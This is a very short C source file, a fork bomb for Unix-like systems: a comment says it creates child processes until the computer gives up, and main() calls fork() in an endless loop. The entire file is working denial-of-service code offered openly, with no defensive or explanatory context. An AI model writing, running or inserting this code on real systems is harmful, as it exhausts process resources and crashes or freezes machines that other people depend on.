// A fork-bomb that creates lots of child process till the computer gives up. Works on Unix-like OS.

#include <unistd.h>

int main(){
    while(1) fork();
}
